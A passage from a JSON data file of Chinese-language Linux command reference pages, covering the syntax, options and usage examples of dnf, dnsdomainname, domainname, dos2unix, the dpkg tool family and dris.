</p>\n<p>用处：该命令用于获取有关某条命令的使用帮助（包括可用于该命令的参数和该命令的用途说明）（本例中我们将使用命令获取有关命令”clean”的使用帮助）</p>\n<pre><code class=\"language-shell\">dnf <span class=\"hljs-built_in\">help</span> clean\n</code></pre>\n<p><strong>查看所有的 DNF 命令及其用途</strong> </p>\n<p>用处：该命令用于列出所有的 DNF 命令及其用途</p>\n<pre><code class=\"language-shell\">dnf <span class=\"hljs-built_in\">help</span>\n</code></pre>\n<p><strong>查看 DNF 命令的执行历史</strong> </p>\n<p>用处：您可以使用该命令来查看您系统上 DNF 命令的执行历史。通过这个手段您可以知道在自您使用 DNF 开始有什么软件被安装和卸载。</p>\n<pre><code class=\"language-shell\">dnf <span class=\"hljs-built_in\">history</span>\n</code></pre>\n<p><strong>查看所有的软件包组</strong> </p>\n<p>用处：该命令用于列出所有的软件包组</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">dnf grouplist</span>\n</code></pre>\n<p><strong>安装一个软件包组</strong> </p>\n<p>用处：该命令用于安装一个软件包组（本例中，我们将用命令安装”Educational Software”这个软件包组）</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">dnf</span> groupinstall ‘Educational Software’\n</code></pre>\n<p><strong>升级一个软件包组中的软件包</strong> </p>\n<p>用处：该命令用于升级一个软件包组中的软件包（本例中，我们将用命令升级”Educational Software”这个软件包组中的软件）</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">dnf</span> groupupdate ‘Educational Software’\n</code></pre>\n<p><strong>删除一个软件包组</strong> </p>\n<p>用处：该命令用于删除一个软件包组（本例中，我们将用命令删除”Educational Software”这个软件包组）</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">dnf</span> groupremove ‘Educational Software’\n</code></pre>\n<p><strong>从特定的软件包库安装特定的软件</strong> </p>\n<p>用处：该命令用于从特定的软件包库安装特定的软件（本例中我们将使用命令从软件包库 epel 中安装 phpmyadmin 软件包）</p>\n<pre><code class=\"language-shell\">dnf –<span class=\"hljs-attribute\">enablerepo</span>=epel install phpmyadmin\n</code></pre>\n<p><strong>更新软件包到最新的稳定发行版</strong> </p>\n<p>用处：该命令可以通过所有可用的软件源将已经安装的所有软件包更新到最新的稳定发行版</p>\n<pre><code class=\"language-shell\">dnf distro-<span class=\"hljs-keyword\">sync</span>\n</code></pre>\n<p><strong>重新安装特定软件包</strong> </p>\n<p>用处：该命令用于重新安装特定软件包（本例中，我们将使用命令重新安装”nano”这个软件包）</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">dnf reinstall nano</span>\n</code></pre>\n<p><strong>回滚某个特定软件的版本</strong> </p>\n<p>用处：该命令用于降低特定软件包的版本（如果可能的话）（本例中，我们将使用命令降低”acpid”这个软件包的版本）</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">dnf downgrade acpid</span>\n</code></pre>\n<p>样例输出：</p>\n<pre><code class=\"language-shell\">Using metadata from Wed May 20 12:44:59 2015\nNo match for available package: acpid<span class=\"hljs-string\">-2</span>.0.19<span class=\"hljs-string\">-5</span>.el7.x86_64\n<span class=\"hljs-keyword\">Error: </span>Nothing to do.\n</code></pre>\n<p>原作者注：在执行这条命令的时候， DNF 并没有按照我期望的那样降级指定的软件（“acpid”）。该问题已经上报。</p>\n<h3 id=\"总结\">总结</h3>\n<p>DNF 包管理器作为 YUM 包管理器的升级替代品，它能自动完成更多的操作。但在我看来，正因如此，所以 DNF 包管理器不会太受那些经验老道的 Linux 系统管理者的欢迎。举例如下：</p>\n<ol>\n<li> 在 DNF 中没有 –skip-broken 命令，并且没有替代命令供选择。</li>\n<li> 在 DNF 中没有判断哪个包提供了指定依赖的 resolvedep 命令。</li>\n<li> 在 DNF 中没有用来列出某个软件依赖包的 deplist 命令。</li>\n<li> 当你在 DNF 中排除了某个软件库，那么该操作将会影响到你之后所有的操作，不像在 YUM 下那样，你的排除操作只会咋升级和安装软件时才起作用。</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "dnsdomainname",
        "des": "定义DNS系统中FQDN名称的域名",
        "body": "<h1 id=\"dnsdomainname\">dnsdomainname</h1>\n<p>定义DNS系统中FQDN名称的域名</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>dnsdomainname命令</strong> 用于定义DNS系统中FQDN名称中的域名。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">dnsdomainname</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-v：详细信息模式，输出指令执行的详细信息。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">[root@AY1307311912260196fcZ ~]# dnsdomainname -v\ngethostname()=`AY1307311912260196fcZ<span class=\"hljs-comment\">'</span>\nResolving `AY1307311912260196fcZ<span class=\"hljs-comment\">' ...</span>\n<span class=\"hljs-symbol\">Result:</span> h_name=`AY1307311912260196fcZ<span class=\"hljs-comment\">'</span>\n<span class=\"hljs-symbol\">Result:</span> h_addr_list=`<span class=\"hljs-number\">10.160</span>.<span class=\"hljs-number\">7.81</span><span class=\"hljs-comment\">'</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "domainname",
        "des": "显示和设置系统的NIS域名",
        "body": "<h1 id=\"domainname\">domainname</h1>\n<p>显示和设置系统的NIS域名</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>domainname命令</strong> 用于显示和设置系统的NIS域名。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">domainname</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-v：详细信息模式；</span>\n<span class=\"hljs-deletion\">-F：指定读取域名信息的文件。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>NIS域名：指定要设置的NIS域名。</p>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-meta\">@AY1307311912260196fcZ</span> ~]<span class=\"hljs-comment\"># domainname -v</span>\ngetdomainname()=`(none)'\n(none)\n [root<span class=\"hljs-meta\">@AY1307311912260196fcZ</span> ~]<span class=\"hljs-comment\"># domainname</span>\nwww.jsdig.com\n\n[root<span class=\"hljs-meta\">@AY1307311912260196fcZ</span> ~]<span class=\"hljs-comment\"># domainname -v</span>\ngetdomainname()=`www.jsdig.com'\nwww.jsdig.com\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "dos2unix",
        "des": "将DOS格式文本文件转换成Unix格式",
        "body": "<h1 id=\"dos2unix\">dos2unix</h1>\n<p>将DOS格式文本文件转换成Unix格式</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>dos2unix命令</strong> 用来将DOS格式的文本文件转换成UNIX格式的（DOS/MAC to UNIX text file format converter）。DOS下的文本文件是以<code>\\r\\n</code>作为断行标志的，表示成十六进制就是0D 0A。而Unix下的文本文件是以\\n作为断行标志的，表示成十六进制就是0A。DOS格式的文本文件在Linux底下，用较低版本的vi打开时行尾会显示<code>^M</code>，而且很多命令都无法很好的处理这种格式的文件，如果是个shell脚本，。而Unix格式的文本文件在Windows下用Notepad打开时会拼在一起显示。因此产生了两种格式文件相互转换的需求，对应的将UNIX格式文本文件转成成DOS格式的是unix2dos命令。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">dos2unix <span class=\"hljs-selector-attr\">[-hkqV]</span> <span class=\"hljs-selector-attr\">[-c convmode]</span> <span class=\"hljs-selector-attr\">[-o file ...]</span> <span class=\"hljs-selector-attr\">[-n infile outfile ...]</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-k：保持输出文件的日期不变</span>\n<span class=\"hljs-deletion\">-q：安静模式，不提示任何警告信息。</span>\n<span class=\"hljs-deletion\">-V：查看版本</span>\n<span class=\"hljs-deletion\">-c：转换模式，模式有：ASCII, 7bit, ISO, Mac, 默认是：ASCII。</span>\n<span class=\"hljs-deletion\">-o：写入到源文件</span>\n<span class=\"hljs-deletion\">-n：写入到新文件</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>参数：需要转换到文件。</p>\n<h3 id=\"实例\">实例</h3>\n<p>最简单的用法就是dos2unix直接跟上文件名：</p>\n<pre><code class=\"language-shell\">dos2unix <span class=\"hljs-built_in\">file</span>\n</code></pre>\n<p>如果一次转换多个文件，把这些文件名直接跟在dos2unix之后。（注：也可以加上<code>-o</code>参数，也可以不加，效果一样）</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">dos2unix</span> file1 file2 file3\ndos2unix -o file1 file2 file3\n</code></pre>\n<p>上面在转换时，都会直接在原来的文件上修改，如果想把转换的结果保存在别的文件，而源文件不变，则可以使用<code>-n</code>参数。</p>\n<pre><code class=\"language-shell\">dos2unix oldfile <span class=\"hljs-keyword\">new</span><span class=\"hljs-type\">file</span>\n</code></pre>\n<p>如果要保持文件时间戳不变，加上<code>-k</code>参数。所以上面几条命令都是可以加上<code>-k</code>参数来保持文件时间戳的。</p>\n<pre><code class=\"language-shell\">dos2unix -k <span class=\"hljs-built_in\">file</span>\ndos2unix -k file1 file2 file3\ndos2unix -k -o file1 file2 file3\ndos2unix -k -n oldfile newfile\n</code></pre>\n<p>转换当前目录下所有文件</p>\n<pre><code class=\"language-shell\">find -<span class=\"hljs-keyword\">type</span> <span class=\"hljs-type\">f </span>| xargs dos2unix\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "dpkg-deb",
        "des": "Debian Linux下的软件包管理工具",
        "body": "<h1 id=\"dpkg-deb\">dpkg-deb</h1>\n<p>Debian Linux下的软件包管理工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>dpkg-deb命令</strong> 是Debian Linux下的软件包管理工具，它可以对软件包执行打包和解包操作以及提供软件包信息。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">dpkg-deb</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-c：显示软件包中的文件列表；</span>\n<span class=\"hljs-deletion\">-e：将主控信息解压；</span>\n<span class=\"hljs-deletion\">-f：把字段内容打印到标准输出；</span>\n<span class=\"hljs-deletion\">-x：将软件包中的文件释放到指定目录下；</span>\n<span class=\"hljs-deletion\">-X：将软件包中的文件释放到指定目录下，并显示释放文件的详细过程；</span>\n<span class=\"hljs-deletion\">-w：显示软件包的信息；</span>\n<span class=\"hljs-deletion\">-l：显示软件包的详细信息；</span>\n<span class=\"hljs-deletion\">-R：提取控制信息和存档的清单文件；</span>\n<span class=\"hljs-deletion\">-b：创建debian软件包。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定要操作的“.deb”软件包的全名或软件名。</p>\n<h3 id=\"实例\">实例</h3>\n<p>解压程序文件：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">dpkg</span>-deb -x drcom-pum_1.<span class=\"hljs-number\">0</span>-<span class=\"hljs-number\">0</span>ubuntu1~ppa1~jaunty1_i386.deb drcom\n</code></pre>\n<p>解压控制文件：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">dpkg</span>-deb -e drcom-pum_1.<span class=\"hljs-number\">0</span>-<span class=\"hljs-number\">0</span>ubuntu1~ppa1~jaunty1_i386.deb drcom/DEBIAN\n</code></pre>\n<p>打包生成deb文件：</p>\n<pre><code class=\"language-shell\">dpkg-<span class=\"hljs-keyword\">deb</span> -<span class=\"hljs-keyword\">b</span> drcom drcom_1.<span class=\"hljs-number\">4.8</span>.<span class=\"hljs-number\">2</span>_i386.<span class=\"hljs-keyword\">deb</span>\n</code></pre>\n<p>查询deb包中的文件内容：</p>\n<pre><code class=\"language-shell\">dpkg-<span class=\"hljs-keyword\">deb</span> -<span class=\"hljs-keyword\">c</span> demo.<span class=\"hljs-keyword\">deb</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "dpkg-divert",
        "des": "Debian Linux中创建并管理一个转向列表",
        "body": "<h1 id=\"dpkg-divert\">dpkg-divert</h1>\n<p>Debian Linux中创建并管理一个转向列表</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>dpkg-divert命令</strong> 是Debian Linux中创建并管理一个转向（diversion）列表，其使得安装文件的默认位置失效的工具。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">dpkg-divert</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">--add：添加一个转移文件；</span>\n<span class=\"hljs-comment\">--remove：删除一个转移文件；</span>\n<span class=\"hljs-comment\">--list：列出匹配的转移；</span>\n<span class=\"hljs-comment\">--truename：对应转移文件真实文件名；</span>\n<span class=\"hljs-comment\">--quidet：安静模式。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定转移文件名。</p>\n<h3 id=\"实例\">实例</h3>\n<p>指定软件包wibble安装时，写入<code>/usr/bin/example.foo</code>，而不是<code>/usr/bin/example</code>：</p>\n<pre><code class=\"language-shell\">dpkg-divert --<span class=\"hljs-keyword\">package</span> wibble --divert <span class=\"hljs-regexp\">/usr/</span>bin<span class=\"hljs-regexp\">/example.foo --rename /u</span>sr<span class=\"hljs-regexp\">/bin/</span>example\n</code></pre>\n<p>指定软件包wibble安装时，删除对<code>/usr/bin/example</code>的转移修改：</p>\n<pre><code class=\"language-shell\">dpkg-divert <span class=\"hljs-params\">--package</span> wibble <span class=\"hljs-params\">--rename</span> <span class=\"hljs-params\">--remove</span> <span class=\"hljs-string\">/usr/bin/example</span>\n</code></pre>\n<p>删除对<code>/usr/bin/example</code>的转移修改：</p>\n<pre><code class=\"language-shell\">dpkg-divert <span class=\"hljs-params\">--rename</span> <span class=\"hljs-params\">--remove</span> <span class=\"hljs-string\">/usr/bin/example</span>\n</code></pre>\n<p>添加一个软件包安装时，写入<code>/usr/bin/example.foo</code>，而不是<code>/usr/bin/example</code>的修改：</p>\n<pre><code class=\"language-shell\">dpkg-divert --divert <span class=\"hljs-regexp\">/usr/</span>bin<span class=\"hljs-regexp\">/example.foo --rename /u</span>sr<span class=\"hljs-regexp\">/bin/</span>example\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "dpkg-preconfigure",
        "des": "Debian Linux中软件包安装之前询问问题",
        "body": "<h1 id=\"dpkg-preconfigure\">dpkg-preconfigure</h1>\n<p>Debian Linux中软件包安装之前询问问题</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>dpkg-preconfigure命令</strong> 用于在Debian Linux中软件包安装之前询问问题。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">dpkg-preconfigure</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-f：选择使用的前端；</span>\n<span class=\"hljs-deletion\">-p：感兴趣的最低的优先级问题；</span>\n<span class=\"hljs-deletion\">--apt：在apt模式下运行。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>软件包：指定“.deb”软件包。</p>\n<h3 id=\"实例\">实例</h3>\n<p>导入debconf模板：</p>\n<pre><code class=\"language-shell\">dpkg-preconfigure <span class=\"hljs-regexp\">/var/</span>cache<span class=\"hljs-regexp\">/apt/</span>archives/mysql-server-<span class=\"hljs-number\">5.5</span>*.deb\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "dpkg-query",
        "des": "Debian Linux中软件包的查询工具",
        "body": "<h1 id=\"dpkg-query\">dpkg-query</h1>\n<p>Debian Linux中软件包的查询工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>dpkg-query命令</strong> 是Debian Linux中软件包的查询工具，它从dpkg软件包数据库中查询并辨识软件包的信息。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">dpkg-query</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-l：列出符合匹配模式的软件包；</span>\n<span class=\"hljs-deletion\">-s：查询软件包的状态信息；</span>\n<span class=\"hljs-deletion\">-L：显示软件包所安装的文件列表；</span>\n<span class=\"hljs-deletion\">-S：从安装的软件包中查询文件；</span>\n<span class=\"hljs-deletion\">-w：显示软件包信息；</span>\n<span class=\"hljs-deletion\">-c：显示软件包的控制文件路径；</span>\n<span class=\"hljs-deletion\">-p：显示软件包的细节。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>软件包名称：指定需要查询的软件包。</p>\n<h3 id=\"实例\">实例</h3>\n<p>查找文件file1在哪个包里安装：</p>\n<pre><code class=\"language-shell\">dpkg-<span class=\"hljs-keyword\">query</span> -S file1\n</code></pre>\n<p>列出ubuntu下所安装软件列表：</p>\n<pre><code class=\"language-shell\">dpkg-query -W --showformat=<span class=\"hljs-string\">'<span class=\"hljs-subst\">${Package}</span> <span class=\"hljs-subst\">${Version}</span>\\n'</span> &gt; filename\n</code></pre>\n<p>查看软件包详细信息：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">dpkg-query -s capistrano</span>\n</code></pre>\n<p>查看软件包安装时安装到系统的文件列表：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">dpkg-query -L capistrano</span>\n</code></pre>\n<p>列出所有安装的包：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">dpkg-query -l</span>\n</code></pre>\n<p>查看软件包的确切状态（是否安装）以及版本号：</p>\n<pre><code class=\"language-shell\">dpkg-query -W -f=<span class=\"hljs-string\">'<span class=\"hljs-subst\">${Status}</span> <span class=\"hljs-subst\">${Version}</span>\\n'</span> apache-perl\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "dpkg-reconfigure",
        "des": "Debian Linux中重新配制一个已经安装的软件包",
        "body": "<h1 id=\"dpkg-reconfigure\">dpkg-reconfigure</h1>\n<p>Debian Linux中重新配制一个已经安装的软件包</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>dpkg-reconfigure命令</strong> 是Debian Linux中重新配置已经安装过的软件包，可以将一个或者多个已安装的软件包传递给此指令，它将询问软件初次安装后的配置问题。</p>\n<p>当用户需要再次对软件包配置的时候，可以使用dpkg-reconfigure命令来对指定的软件包进行配置。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">dpkg-reconfigure</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a：重新配置所有的软件包；</span>\n<span class=\"hljs-deletion\">-u或--unseen-only：仅显示未提过的问题；</span>\n<span class=\"hljs-deletion\">--default-priority：使用默认优先级，而非“低”级；</span>\n<span class=\"hljs-deletion\">--force：强制执行操作，需谨慎使用此选项；</span>\n<span class=\"hljs-deletion\">--no-reload：不要轻易的重装模板（使用时请慎重考虑）；</span>\n<span class=\"hljs-deletion\">-f或--frontend：指定 debconf 前端界面；</span>\n<span class=\"hljs-deletion\">-p或--priority：指定要显示的问题的最优先级；</span>\n<span class=\"hljs-deletion\">--terse：开启简要模式。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>软件包名：需要重新配置的已安装的软件包。</p>\n<h3 id=\"实例\">实例</h3>\n<p>用于配置语言：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">sudo dpkg-reconfigure locales</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "dpkg-split",
        "des": "Debian Linux中将大软件包分割成小包",
        "body": "<h1 id=\"dpkg-split\">dpkg-split</h1>\n<p>Debian Linux中将大软件包分割成小包</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>dpkg-split命令</strong> 用来将Debian Linux中的大软件包分割成小软件包，它还能够将已分割的文件进行合并。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">dpkg-split</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-S：设置分割后的每个小文件最大尺寸（以字节为单位）；</span>\n<span class=\"hljs-deletion\">-s：分割软件包；</span>\n<span class=\"hljs-deletion\">-j&lt;分块文件&gt;&lt;分块文件&gt;：把各个分块合并到一起；</span>\n<span class=\"hljs-deletion\">-I&lt;分块文件&gt;：显示分块文件的相关信息；</span>\n<span class=\"hljs-deletion\">-l：列出不匹配的部分；</span>\n<span class=\"hljs-deletion\">-dscard&lt;文件名&gt;：忽略不匹配的部分。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>软件包：指定需要分割的“.deb”软件包。</p>\n<h3 id=\"实例\">实例</h3>\n<p>把foo.deb分割出N个大小为460KB的文件：</p>\n<pre><code class=\"language-shell\">dpkg-<span class=\"hljs-keyword\">split</span> -s foo.<span class=\"hljs-keyword\">deb</span>\n</code></pre>\n<p>合并分割文件：</p>\n<pre><code class=\"language-shell\">dpkg-<span class=\"hljs-built_in\">split</span> -j <span class=\"hljs-string\">\"foo*\"</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "dpkg-statoverride",
        "des": "Debian Linux中覆盖文件的所有权和模式",
        "body": "<h1 id=\"dpkg-statoverride\">dpkg-statoverride</h1>\n<p>Debian Linux中覆盖文件的所有权和模式</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>dpkg-statoverride命令</strong> 用于Debian Linux中覆盖文件的所有权和模式，让dpkg于包安装时使得文件所有权与模式失效。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">dpkg-statoverride</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-add：为文件添加一个改写；</span>\n<span class=\"hljs-deletion\">--remove：为文件删除一个改写；</span>\n<span class=\"hljs-deletion\">--list：显示所有改写列表；</span>\n<span class=\"hljs-deletion\">--update：如果文件存在，则立刻执行改写操作。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>修改文件夹的权限属性：</p>\n<pre><code class=\"language-shell\">sudo dpkg-statoverride <span class=\"hljs-params\">--update</span> <span class=\"hljs-params\">--add</span> nagios nagios 751 <span class=\"hljs-string\">/var/lib/nagios3</span>\n</code></pre>\n<p>强制修改文件夹的权限属性：</p>\n<pre><code class=\"language-shell\">sudo dpkg-statoverride --force --update --add root sasl <span class=\"hljs-number\">755</span> <span class=\"hljs-regexp\">/var/</span>spool<span class=\"hljs-regexp\">/postfix/</span>var<span class=\"hljs-regexp\">/run/</span>saslauthd\n</code></pre>\n<p>将文件从数据库中删除：</p>\n<pre><code class=\"language-shell\">sudo dpkg-statoverride --remove <span class=\"hljs-regexp\">/usr/</span>bin/wall\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "dpkg-trigger",
        "des": "Debian Linux下的软件包触发器",
        "body": "<h1 id=\"dpkg-trigger\">dpkg-trigger</h1>\n<p>Debian Linux下的软件包触发器</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>dpkg-trigger命令</strong> 是Debian Linux下的软件包触发器。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">dpkg-trigger</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">--check-supported：检查运行的dpkg是否支持触发器，返回值为0，则支持触发器。</span>\n<span class=\"hljs-comment\">--help：显示帮助信息；</span>\n<span class=\"hljs-comment\">--admindir=&lt;目录&gt;：设置dpkg数据库所在的目录；</span>\n<span class=\"hljs-comment\">--no-act：仅用于测试，不执行任何操作；</span>\n<span class=\"hljs-comment\">--by-package=&lt;软件包&gt;：覆盖触发器等待者。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>触发器名：指定触发器名称。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "dpkg",
        "des": "Debian Linux系统上安装、创建和管理软件包",
        "body": "<h1 id=\"dpkg\">dpkg</h1>\n<p>Debian Linux系统上安装、创建和管理软件包</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>dpkg命令</strong> 是Debian Linux系统用来安装、创建和管理软件包的实用工具。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">dpkg</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-i：安装软件包；</span>\n<span class=\"hljs-deletion\">-r：删除软件包；</span>\n<span class=\"hljs-deletion\">-P：删除软件包的同时删除其配置文件；</span>\n<span class=\"hljs-deletion\">-L：显示于软件包关联的文件；</span>\n<span class=\"hljs-deletion\">-l：显示已安装软件包列表；</span>\n<span class=\"hljs-deletion\">--unpack：解开软件包；</span>\n<span class=\"hljs-deletion\">-c：显示软件包内文件列表；</span>\n<span class=\"hljs-deletion\">--confiugre：配置软件包。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>Deb软件包：指定要操作的.deb软件包。</p>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">dpkg -i <span class=\"hljs-keyword\">package</span>.deb     <span class=\"hljs-meta\"># 安装包</span>\ndpkg -r <span class=\"hljs-keyword\">package</span>         <span class=\"hljs-meta\"># 删除包</span>\ndpkg -P <span class=\"hljs-keyword\">package</span>         <span class=\"hljs-meta\"># 删除包（包括配置文件）</span>\ndpkg -L <span class=\"hljs-keyword\">package</span>         <span class=\"hljs-meta\"># 列出与该包关联的文件</span>\ndpkg -l <span class=\"hljs-keyword\">package</span>         <span class=\"hljs-meta\"># 显示该包的版本</span>\ndpkg --unpack <span class=\"hljs-keyword\">package</span>.deb  <span class=\"hljs-meta\"># 解开deb包的内容</span>\ndpkg -S keyword            <span class=\"hljs-meta\"># 搜索所属的包内容</span>\ndpkg -l                    <span class=\"hljs-meta\"># 列出当前已安装的包</span>\ndpkg -c <span class=\"hljs-keyword\">package</span>.deb        <span class=\"hljs-meta\"># 列出deb包的内容</span>\ndpkg --configure <span class=\"hljs-keyword\">package</span>   <span class=\"hljs-meta\"># 配置包</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "dris",
        "des": "显示和清空目录堆栈中的内容",
        "body": "<h1 id=\"dris\">dris</h1>\n<p>显示和清空目录堆栈中的内容</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>dris命令</strong> 用于显示和清空目录堆栈中的内容。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">dris</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">+<span class=\"hljs-built_in\">n</span>：显示从左边算起第<span class=\"hljs-built_in\">n</span>笔的目录；\n-<span class=\"hljs-built_in\">n</span>：显示从右边算起第<span class=\"hljs-built_in\">n</span>笔的目录；\n-l：显示目录完整的记录。\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "dstat",
        "des": "通用的系统资源统计工具",
